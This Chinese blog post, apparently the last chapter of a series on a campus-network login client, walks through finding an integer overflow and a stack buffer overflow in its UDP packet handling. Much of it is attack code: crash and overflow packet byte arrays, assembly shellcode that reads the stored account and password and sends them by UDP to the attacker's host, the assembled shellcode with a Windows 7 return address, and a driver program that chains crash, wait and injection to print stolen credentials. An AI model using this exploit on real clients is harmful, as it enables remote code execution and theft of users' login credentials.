---
published: true
title: 5. Overflow 攻击获取远程用户帐号密码
layout: post
authors: p74n3_1C4tr0
category: Crack
tags: Crack
---


本章所使用到的工具和环境

>IDA pro ,OllyDBG

**来自IDA 的迷惑**

我们知道,要发掘远程代码执行漏洞,必须要在接收数据函数附近发掘.由于校园网登陆客户端采用UDP 通信,所以第一步要做的就是定位recvfrom 函数在哪个位置被调用.于是利用OD 在recvfrom 的入口处设置断点,然后找到下面的这个地方.

![1](http://ww3.sinaimg.cn/large/005YTBXDgw1ev03jhuysyj30fe049dgv.jpg)

<!-- more -->
往下继续跟踪代码,发现这里有一个根据数据包内设置的标志来跳转的判断

![2](http://ww4.sinaimg.cn/large/005YTBXDgw1ev03k6k8cbj30fe055jst.jpg)

继续往下跟踪,发现接收的所有数据包的标志都是0x04,而且在代码

![3](http://ww2.sinaimg.cn/large/005YTBXDgw1ev03kn40vsj30fe01jaag.jpg)

中已经被限定只能接收标志为0x04 的数据包.于是找到处理标志为0x04 的数据包的函数,发现可以利用数据包中的数据块长度溢出函数返回地址,首先,函数处理的栈帧长度小于0xFF

![4](http://ww1.sinaimg.cn/large/005YTBXDgw1ev03l3req7j309u02oaa4.jpg)

然后我们利用IDA 转换成伪C 代码分析.发现这里有一处溢出.原理是通过构造数据块长度为0xFF ,使得memcpy 把数据块覆盖了原来的栈帧

![5](http://ww4.sinaimg.cn/large/005YTBXDgw1ev03llaj0jj30fe03ndgg.jpg)

然后构造了下面的POC 代码,结果程序没有被溢出,而是产生了内存引用出错

```c++
char buffer_crash[]={0x04/*packet_flag*/,0x94/*packet_length*/,/*calcu_md5*/0x52,0xEA,0x47,0x45,0xA5,0x02,0x5E,0x6F,0x65,0x48,0x82,0x9B,0x18,0x18,0x02,0xBC,0x08/*struct_key*/,0xFF/*struct_length*/,/*NOP  CODE*/0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90};
```

![6](http://ww2.sinaimg.cn/large/005YTBXDgw1ev03mtqejij30e50cqq55.jpg)

于是转换成汇编代码看一看究竟是哪个地方出个问题,结果大吃一惊

![7](http://ww3.sinaimg.cn/large/005YTBXDgw1ev03nc2j96j30et07n0tw.jpg)

注意汇编代码:movsx eax,byte ptr [edx] .如果从edx 中读取出来的数据不大于0x80 ,那么eax 的值就是0x00000080 ,如果大于0x80 ,那么eax 的值就是0xFFFFFF00 + byte ptr [edx] .真实调用memcpy() 的情况是:

<code>memcpy(&local_buffer, (const void *)(struct_key + 2), 0xFFFFFFFF );</code>

毫无疑问,是复制内存访问到无效的内存而导致的.所以这段Shell Code 只能使客户端Crash 掉而不能被注入代码,所以把这个漏洞称为整数溢出

>绝处逢生

仔细一想,客户端登陆的时候也会产生数据交互流程,抓包分析一下,发现这个数据包的标志为`0x02`

![8](http://ww1.sinaimg.cn/large/005YTBXDgw1ev03ongl9hj30fe02qwf8.jpg)

进入处理函数查看,发现这个地方是可以被注入远程代码的.

首先,该函数的栈大小同样也小于`0xFF`

![9](http://ww3.sinaimg.cn/large/005YTBXDgw1ev03p80ag6j30cm03paah.jpg)

然后在处理数据块标志为8 的地方同样也发现了可以溢出攻击的地方

![10](http://ww1.sinaimg.cn/large/005YTBXDgw1ev03pkr25kj30fd06075i.jpg)

为了不被迷惑,所以下面从汇编的角度来做分析

![11](http://ww3.sinaimg.cn/large/005YTBXDgw1ev03pz2v95j30fe0bpmzr.jpg)

在这里ecx 是直接从内存中读取的,不像刚才那样会设置ecx 的高位为1 ,所以这个地方是可以被溢出的,验证POC 如下:

```c++
char buffer_overflow[]={0x02,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                            0x25 /*struct_key*/,0xFF/*struct_length*/,/*NOP CODE */0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90}
```

发送构造好的数据包过去,客户端有了反应.

![12](http://ww2.sinaimg.cn/large/005YTBXDgw1ev03rauq6kj308x0a0q3z.jpg)

任意点击之后,程序崩溃

![13](http://ww2.sinaimg.cn/large/005YTBXDgw1ev03rt5c3yj30e50cqtar.jpg)

为了进一步验证是否为真实的溢出点,接下来用OD 做调试:

![14](http://ww4.sinaimg.cn/large/005YTBXDgw1ev03sb2qqdj30fd0b177i.jpg)

至此已经成功验证这个函数是可以被溢出执行远程代码的

>综合利用

客户端崩溃了以后,在重新登陆到服务器的时候有一小段延迟时间.

![15](http://ww2.sinaimg.cn/large/005YTBXDgw1ev03sxgu61j30fd01agly.jpg)

所以我们只能够在这段时间内注入我们的溢出代码.问题是怎么才可以做到这个效果呢?聪明的你应该已经想到,利用的过程如下:

>1.发送崩溃数据包(整数溢出),使远程客户端崩溃
>2.等待对方重启动客户端
>3.把ShellCode 数据包(缓冲区溢出)注入到正在登陆的客户端中

由于可以利用的注入代码空间比较小,所以把ShellCode 的功能写成到盗取客户端的帐号密码并且返回到远程主机,ShellCode 的汇编代码如下(在VC++ 6 下编译通过):

```asm
Shell Code V1 :

                mov byte ptr [esp+0x10],41h;
                mov byte ptr [esp+0x11],3Ah;
                mov byte ptr [esp+0x22],50h;
                mov byte ptr [esp+0x23],3Ah;

                mov ecx,0x4;
                lea edi,byte ptr [esp+0x12];
                mov esi,0x45B7E8;  //  帐号
                rep movsd;

                mov ecx,0x4;
                lea edi,byte ptr [esp+0x24];
                mov esi,0x45B808;  //  密码
                rep movsd;

                lea ebx,byte ptr [esp+0x10];
                lea ecx,byte ptr [ebp+0x12];  //  IP Address
                xor edx,edx;
                mov dx,0x2793;  //  IP Port
                push edx;
                push ecx;
                mov eax,0x24;
                push eax;
                push ebx;
                mov eax,dword ptr [0x526424];  //  UDP Socket
                push eax;
                mov eax,0x418B40;  //  udp_send()
                call eax;
```

返回的帐号密码的数据包结构:

>Password Packet:
>( 数据包开头 ) A:_16B_P:_16B_ (数据包结尾)

得出的ShellCode 如下

```c++
char buffer_overflow[]={0x02,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00, 0x25 /* struct_key */,0xB5 /*struct_length*/,/* NOP  CODE 0x9B B WARNING! 只能理由后0x76 位,并且需要注意ESP *//* NOP 炮灰代码 */0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90, /* NOP 段可利用代码 */0xC6,0x44,0x24,0x10,0x41,0xC6,0x44,0x24,0x11,0x3A,0xC6,0x44,0x24,0x22,0x50,0xC6,0x44,0x24,0x23,0x3A,0xB9,0x04,0x00,0x00,0x00,0x8D,0x7C,0x24,0x12,0xBE,0xE8,0xB7,0x45,0x00,0xF3,0xA5,0xB9,0x04,0x00,0x00,0x00,0x8D,0x7C,0x24,0x24,0xBE,0x08,0xB8,0x45,0x00,0xF3,0xA5,0x8D,0x5C,0x24,0x10,0x8D,0x4D,0x1A,0x33,0xD2,0x66,0xBA,0x93,0x27,0x52,0x51,0xB8,0x24,0x00,0x00,0x00,0x50,0x53,0xA1,0x24,0x64,0x52,0x00,0x50,0xB8,0x40,0x8B,0x41,0x00,0xFF,0xD0,0xD0,0x6F,0x72,0x6C,0x64,0x21,0x00,0x54,0x45,0x53,0x54,0x00,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90, /* 后四位不能使用,会自动变成0xFFFFFFFF *//* RET  ADDR 0x04 B */0xDD,0x8B,0xF2,0x76, /* jmp esp  -  Win7 Server Pack 1 *//*SHELL CODE 0x16 B */0x8B,0xEC,0x83,0xED,0x08,0x81,0xEC,0x00,0x01,0x00,0x00, /*mov ebp,esp;sub ebp,0x8;sub esp,0x100;*/0x8B,0xC5,0x83,0xE8,0x76,0xFF,0xE0,/*mov eax,ebp;sub eax,0x76;jmp eax; *//*后面填写IP 地址*/0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC};
```

由于源代码太过亢长(需要对数据包进行MD5 计算和伪造服务器的IP 地址)不公开所有的代码,所以下面直接演示攻击过程

程序的主体代码如下:

```c++
int main(void) {
    packet_init();

    char ip[0x11]={0};
    scanf("%s",ip);

    printf("Crashing!\n");
    send_packet_crash(ip);

    Sleep(5000);

    printf("Overflowing!\n");
    send_packet_overflow(ip);

    char recv_buffer[0x25]={0};
    int recv_length=packet_recv(recv_buffer);
    
    if (-1!=recv_length)
        printf("RECV(%d):Account=%s Password=%s\n",recv_length,&recv_buffer[0x02],&recv_buffer[0x14]);
    else
        printf("RECV ERROR!\n");

    packet_clean();
	return 0;
}
```

第一步,崩溃客户端

![16](http://ww4.sinaimg.cn/large/005YTBXDgw1ev03y87lzkj30fe09g761.jpg)

等待客户端登陆的时候发送ShellCode 数据包

![17](http://ww4.sinaimg.cn/large/005YTBXDgw1ev03yruhpjj30fe0a2dh9.jpg)

成功溢出盗取帐号和密码

![18](http://ww4.sinaimg.cn/large/005YTBXDgw1ev03z8kut4j30fe0eb0v8.jpg)

>最后的话

感谢大家把”黑掉蝴蝶”这个系列看完,其实,在写最后一章Overflow 攻击 ,我想了很久,毕竟这是一个可以影响整个华软网络的漏洞,不能发布给大家知道,以免别有用心的人利用来攻击,但是最后斟酌良久,为了让校园网更加安全,有必要应该把它公之于众,恰恰是因为敢公开,原因是这个漏洞需要利用的技术水平很高,可能各位读者只是单纯看到本章直接利用到shellcode 注入就可以获取到帐号密码,其实后面隐含着很多条件,蝴蝶没有这么容易被欺骗,每一次接收数据都会判断数据包的来源IP ,所以必须要使用Winpcap 构造以太网帧才可以达欺骗的目的,修复这个漏洞很简单,如果大家有需求的话可以把整个包含NAT 绕过和修复版公开,现在整个漏洞利用工具(包括红绿蝴蝶帐号密码获取漏洞)已经被开发出来,但不打算对外公开,等到时机成熟再公开吧.